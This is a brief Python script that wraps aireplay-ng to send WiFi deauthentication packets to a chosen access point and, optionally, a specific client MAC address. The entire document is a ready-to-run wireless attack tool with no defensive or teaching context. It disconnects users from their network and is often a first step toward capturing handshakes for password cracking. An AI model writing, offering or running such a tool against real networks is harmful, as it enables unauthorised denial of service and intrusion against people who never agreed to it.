import subprocess
import sys

def send_deauth(interface, bssid, count=5, client=None):
    """Send deauthentication packets."""
    cmd = ["aireplay-ng", "-0", str(count), "-a", bssid]
    
    if client:
        cmd.extend(["-c", client])
    
    cmd.append(interface)
    
    print(f"[*] Sending {count} deauth packets to {bssid}...")
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"[!] Error sending deauth: {e}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", required=True)
    parser.add_argument("-b", "--bssid", required=True)
    parser.add_argument("-c", "--client", help="Specific client MAC")
    parser.add_argument("-n", "--count", type=int, default=5)
    args = parser.parse_args()
    
    send_deauth(args.interface, args.bssid, args.count, args.client)